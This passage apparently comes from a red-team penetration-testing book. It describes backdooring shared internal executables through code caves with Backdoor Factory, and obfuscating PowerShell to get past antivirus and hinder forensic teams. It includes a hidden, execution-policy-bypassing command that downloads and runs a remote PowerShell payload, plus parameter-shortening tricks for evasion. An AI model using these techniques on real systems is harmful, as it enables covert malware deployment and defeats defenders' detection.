  md: "movement a bit more?\n\nThis is where we can get creative and there is no right\
    \ answer (if it works, that's good enough for me). One of my favorite things to\
    \ do once inside an environment is to identify the public shares and files that\
    \ are actively shared/executed. We could try to add macros to Office files, but\
    \ that might come off obvious. One attack that generally has low detection, but\
    \ high success rates, is embedding our custom malware inside executable binaries.\
    \ This could be a shared binary like, with a common internal thick client, or\
    \ even database tools.\n\nAlthough no longer maintained, one of the easiest tools\
    \ to perform these attacks was called Backdoor factory (https://github.com/secretsquirrel/the-backdoor-factory).\
    \ Backdoor factory would look for code caves or empty blocks within a real program,\
    \ where an attacker can inject their own malicious shellcode. This was covered\
    \ in THP2 and the ideas remain the same.\n\n+   Two great additional resources\
    \ for backdoor executables can be found here:\n* https://haiderm.com/fully-undetectable-backdooring-pe-file/#Code_Caves\n\
    * https://www.abatchy.com/2017/05/introduction-to-manual-backdooring-24.html\n\
    \n# PowerShell Obfuscation\n\nThe problem with PowerShell Scripts today is that\
    \ you are dropping them onto disk, many antivirus tools will pick them up. Even\
    \ if you import them into memory, AV tools that look in memory may sometimes alert\
    \ on them,\n\nRegardless, if you are importing them into memory from Cobalt Strike,\
    \ Meterpreter, or PowerShell Empire, it is important to make sure that we don't\
    \ get picked by AV. If we do, we should, at the very least, make it hard for IR/Forensic\
    \ teams to reverse our attack payloads.\n\nWe have all the commands for PowerShell\
    \ like this:\n\n+   * PowerShell.exe -NoProfile -NonInteractive -WindowState Hidden\
    \ -ExecutionPolicy Bypass ISE (New-Object Net.WebClient).DownloadString('[PowerShell\
    \ URL]'); [Parameters]\n\nThis basic combination of strings might be to bypass\
    \ the execution policy, run hidden/noninteractive, and to download and execute\
    \ a PowerShell payload. For Blue Teams, we have seen a lot of logging picked up\
    \ on these specific parameters like \"-Exec Bypass\". So, we started obfuscating\
    \ this parameter by some common PowerShell syntax:\n\n+   * -ExecutionPolicy Bypass\n\
    \    * -EP Bypass"
